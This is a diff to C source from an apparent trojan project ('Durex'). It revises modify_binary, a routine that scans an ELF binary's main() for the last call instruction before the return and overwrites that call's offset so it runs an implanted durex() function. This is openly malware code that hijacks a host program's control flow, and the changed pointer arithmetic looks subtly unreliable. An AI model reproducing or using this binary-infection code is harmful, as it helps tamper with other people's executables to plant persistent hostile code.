@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:21:05 by root              #+#    #+#             */
-/*   Updated: 2018/08/28 18:19:34 by root             ###   ########.fr       */
+/*   Updated: 2018/08/31 09:14:10 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -18,6 +18,8 @@
 #include "main.h"
 /* Elf64 structures*/
 #include <elf.h>
+
+void serverLog(const char *message, ...);
 
 static int		install_error(int fd)
 {
@@ -61,11 +63,14 @@ static int		modify_binary(void *data)
 		return 1;
 	// Now we search for a 'call ...' opcode in the main to replace with another function
 	u_char		*ptr = (u_char *)(data + mainoff); // Begining of "main"
-	int			off = 5; // opcode length of "callq [offset]" is "e8 00 00 00 00" = 5
-	while (*ptr++ != 0xe8)  // Call opcode
-		off++; // Compute offset from main to the first call found
-	off = durexoff - ( mainoff + off ); // Offset from main() + offset to durex()
-	memcpy(ptr, &off, 4); // Change the call of the first function in the main with durex().
+	int			off = 5;				// opcode length of "callq [offset]" is "e8 00 00 00 00" = 5
+	// Compute offset from main to the last call found
+	while (*ptr++ != 0xc3)				// ret opcode (go to the end of main)
+		off++;
+	while (*ptr-- != 0xe8)				// call opcode (get the last call before ret)
+		off--;
+	off = durexoff - ( mainoff + off); // Offset from main() + offset to durex()
+	memcpy(ptr + 2, &off, 4);				// Change the call of the first function in the main with durex().
 	return 0;
 }
 
